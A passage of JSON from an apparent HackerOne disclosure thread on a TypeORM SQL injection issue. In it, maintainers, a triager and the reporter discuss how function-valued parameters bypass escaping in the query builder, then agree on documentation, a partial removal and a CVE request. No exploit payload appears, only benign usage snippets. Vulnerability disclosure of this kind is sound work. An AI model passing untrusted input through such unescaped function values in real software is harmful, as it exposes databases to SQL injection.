code, tests or documentation.\u003c/p\u003e\n\n\u003cp\u003eWe will continue to triage this as a vulnerability. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T19:24:12.618Z","updated_at":"2019-03-08T19:24:12.618Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4288686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Your resolution on continuing this to triage as a vulnerability based on the provided arguments is doubtful.\n\nBased on your arguments first thing I thought on how to resolve this issue is to append additional docs to the escapeQueryWithParameters method. But it won't change anything, because:\n\n* this method itself isn't publicly used a lot, its hard for a user to get to this method and read its docs. By isn't used publicly I mean 99% of users most probably won't ever use this method directly.\n* its being supporting a function that leads to sql instead of escaping is an implementation detail (treat it as something that still allows you to use sql in some your exceptional scenarios), its name can't be `escapeQueryButResolveFunctionSpecificallyAndAlsoCoverXandYExceptionalScenarios`.\n* also what if it was a nameless function? It's not right to make a final thoughts just based on a function name.\n* code itself is a documentation, what if it was missing documentation block at all just like any other lib.\n\nThis feature is covered many times in github issues (and github issues is another source of documentation), here is example on how this can be used:\n\n```ts\ncreateQueryBuilder()\n    .update({\n          name: 'Timber', // this one is escaped\n          age: () =\u003e `age + 1` // this one isn't and its because we have a specific, but very important use case. We want to just increment age, but we can't resolve it using escaped parameter\n    })\n```","markdown_message":"\u003cp\u003eYour resolution on continuing this to triage as a vulnerability based on the provided arguments is doubtful.\u003c/p\u003e\n\n\u003cp\u003eBased on your arguments first thing I thought on how to resolve this issue is to append additional docs to the escapeQueryWithParameters method. But it won\u0026#39;t change anything, because:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ethis method itself isn\u0026#39;t publicly used a lot, its hard for a user to get to this method and read its docs. By isn\u0026#39;t used publicly I mean 99% of users most probably won\u0026#39;t ever use this method directly.\u003c/li\u003e\n\u003cli\u003eits being supporting a function that leads to sql instead of escaping is an implementation detail (treat it as something that still allows you to use sql in some your exceptional scenarios), its name can\u0026#39;t be \u003ccode\u003eescapeQueryButResolveFunctionSpecificallyAndAlsoCoverXandYExceptionalScenarios\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003ealso what if it was a nameless function? It\u0026#39;s not right to make a final thoughts just based on a function name.\u003c/li\u003e\n\u003cli\u003ecode itself is a documentation, what if it was missing documentation block at all just like any other lib.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis feature is covered many times in github issues (and github issues is another source of documentation), here is example on how this can be used:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight typescript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ecreateQueryBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eupdate\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n          \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eTimber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"c1\"\u003e// this one is escaped\u003c/span\u003e\n          \u003cspan class=\"na\"\u003eage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e`age + 1`\u003c/span\u003e \u003cspan class=\"c1\"\u003e// this one isn\u0026#39;t and its because we have a specific, but very important use case. We want to just increment age, but we can\u0026#39;t resolve it using escaped parameter\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-03-08T20:35:14.585Z","updated_at":"2019-03-08T20:35:14.585Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4288902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pleerock \n\nThanks for the additional information.\n\nHow about updating this section of the docs with an example showing the function syntax and explaining that this is a way to opt out of escaping?\n\nhttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/docs/select-query-builder.md#using-parameters-to-escape-data","markdown_message":"\u003cp\u003e\u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThanks for the additional information.\u003c/p\u003e\n\n\u003cp\u003eHow about updating this section of the docs with an example showing the function syntax and explaining that this is a way to opt out of escaping?\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/docs/select-query-builder.md#using-parameters-to-escape-data\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fblob%2Fd9f5581b22c4cccfab55ee23fad699e1c8acadf8%2Fdocs%2Fselect-query-builder.md%23using-parameters-to-escape-data\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/docs/select-query-builder.md#using-parameters-to-escape-data\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T21:19:01.801Z","updated_at":"2019-03-08T21:19:01.801Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4289533,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree with @ronperris, I think it's better to document within query builder section, in complex codebase people can by mistake provide a getter function and it still work for numeric input so they do not realize anything, even if they read all the document on https://typeorm.io/.","markdown_message":"\u003cp\u003eI agree with \u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e, I think it\u0026#39;s better to document within query builder section, in complex codebase people can by mistake provide a getter function and it still work for numeric input so they do not realize anything, even if they read all the document on \u003ca title=\"https://typeorm.io/\" href=\"/redirect?url=https%3A%2F%2Ftypeorm.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://typeorm.io/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-09T00:22:24.372Z","updated_at":"2019-03-09T00:22:24.372Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4289590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think you can do like DB::raw in Laravel for this purpose\nhttps://laravel.com/docs/5.8/queries#raw-expressions\nSo instead of using function you can use a typed expression like:\n\n```ts\ncreateQueryBuilder()\n    .update({\n          name: 'Timber', // this one is escaped\n          age: Raw(`age + 1`)\n    })\n```\n\nThis way will help coder know exactly what they do.","markdown_message":"\u003cp\u003eI think you can do like DB::raw in Laravel for this purpose\u003cbr\u003e\n\u003ca title=\"https://laravel.com/docs/5.8/queries#raw-expressions\" href=\"/redirect?url=https%3A%2F%2Flaravel.com%2Fdocs%2F5.8%2Fqueries%23raw-expressions\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://laravel.com/docs/5.8/queries#raw-expressions\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nSo instead of using function you can use a typed expression like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight typescript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ecreateQueryBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eupdate\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n          \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eTimber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"c1\"\u003e// this one is escaped\u003c/span\u003e\n          \u003cspan class=\"na\"\u003eage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eRaw\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`age + 1`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis way will help coder know exactly what they do.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-09T00:48:07.558Z","updated_at":"2019-03-09T00:48:07.558Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4291944,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@h3dx thanks for your suggestion, but Laravel has its own syntax and TypeORM has its own. But we already have Raw operator that behaves this way but in a different place, we might use it everywhere in the future.\n\n@ronperris I decided to remove this functionality from SelectQueryBuilder since it doesn't make a lot sense, however this functionality still persist in the InsertQueryBuilder and UpdateQueryBuilder. You can take a look changes [here](https://github.com/typeorm/typeorm/pull/3787). I'm going to release a new version in next few days.","markdown_message":"\u003cp\u003e\u003ca href=\"/h3dx\"\u003e@h3dx\u003c/a\u003e thanks for your suggestion, but Laravel has its own syntax and TypeORM has its own. But we already have Raw operator that behaves this way but in a different place, we might use it everywhere in the future.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e I decided to remove this functionality from SelectQueryBuilder since it doesn\u0026#39;t make a lot sense, however this functionality still persist in the InsertQueryBuilder and UpdateQueryBuilder. You can take a look changes \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fpull%2F3787\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. I\u0026#39;m going to release a new version in next few days.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-09T17:23:18.571Z","updated_at":"2019-03-09T17:23:18.571Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4292007,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Seems great @pleerock.\nFor the Raw operator i mean something like `value instanceof Raw` instead of `value instanceof Function` and `Raw('expression')` instead of `()=\u003e'expression'` which is minimal that is compatible with your Function approach and also verbose enough so that developer must sure what they are doing. Anyway, your approach also solved these, that's great.\n","markdown_message":"\u003cp\u003eSeems great \u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e.\u003cbr\u003e\nFor the Raw operator i mean something like \u003ccode\u003evalue instanceof Raw\u003c/code\u003e instead of \u003ccode\u003evalue instanceof Function\u003c/code\u003e and \u003ccode\u003eRaw(\u0026#39;expression\u0026#39;)\u003c/code\u003e instead of \u003ccode\u003e()=\u0026gt;\u0026#39;expression\u0026#39;\u003c/code\u003e which is minimal that is compatible with your Function approach and also verbose enough so that developer must sure what they are doing. Anyway, your approach also solved these, that\u0026#39;s great.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-09T17:53:02.366Z","updated_at":"2019-03-09T18:03:28.253Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4292027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@h3dx yes I've got your point. Not sure it may already work (we already have Raw operator). But anyway function operator will persist for now. ","markdown_message":"\u003cp\u003e\u003ca href=\"/h3dx\"\u003e@h3dx\u003c/a\u003e yes I\u0026#39;ve got your point. Not sure it may already work (we already have Raw operator). But anyway function operator will persist for now. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-09T18:01:47.494Z","updated_at":"2019-03-09T18:01:47.494Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4292100,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-09T18:36:38.087Z","updated_at":"2019-03-09T18:36:38.087Z","additional_data":{"old_title":"SQL injection in npm package typeorm","new_title":"[typeorm] SQL Injection"},"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4329854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ronperris PR with docs is merged and new version is released btw","markdown_message":"\u003cp\u003e\u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e PR with docs is merged and new version is released btw\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-15T12:25:12.900Z","updated_at":"2019-03-15T12:25:12.900Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4344816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great work @pleerock, can we disclosure now?","markdown_message":"\u003cp\u003eGreat work \u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e, can we disclosure now?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-18T11:06:03.149Z","updated_at":"2019-03-18T11:06:03.149Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4376789,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ronperris any update?","markdown_message":"\u003cp\u003e\u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e any update?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-23T08:30:09.978Z","updated_at":"2019-03-23T08:30:09.978Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4426042,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the time and effort you put into this report and resolution @verichains and @pleerock. \n\nWe will be disclosing it shortly and requesting a CVE.","markdown_message":"\u003cp\u003eThank you for the time and effort you put into this report and resolution \u003ca href=\"/verichains\"\u003e@verichains\u003c/a\u003e and \u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eWe will be disclosing it shortly and requesting a CVE.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-30T17:12:16.715Z","updated_at":"2019-03-30T17:12:16.715Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"verichains","url":"/verichains"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4426103,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pleerock Can you point me to the PR that fixed the issue?","markdown_message":"\u003cp\u003e\u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e Can you point me to the PR that fixed the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-30T17:29:29.662Z","updated_at":"2019-03-30T17:29:29.662Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4426331,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ronperris I think it's this one https://github.com/typeorm/typeorm/pull/3787, @pleerock added documenting and tests.","markdown_message":"\u003cp\u003e\u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e I think it\u0026#39;s this one \u003ca title=\"https://github.com/typeorm/typeorm/pull/3787\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fpull%2F3787\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/typeorm/typeorm/pull/3787\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, \u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e added documenting and tests.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-30T19:46:43.559Z","updated_at":"2019-03-30T19:46:43.559Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4426759,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-31T01:59:41.429Z","updated_at":"2019-03-31T01:59:41.429Z","first_to_agree":true,"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4440886,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-02T04:25:24.324Z","updated_at":"2019-04-02T04:25:24.324Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4440887,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-02T04:25:24.396Z","updated_at":"2019-04-02T04:25:24.396Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4876294,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ronperris any update with the CVE?","markdown_message":"\u003cp\u003e\u003ca href=\"/ronperris\"\u003e@ronperris\u003c/a\u003e any update with the CVE?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-19T19:35:24.020Z","updated_at":"2019-05-19T19:35:24.020Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}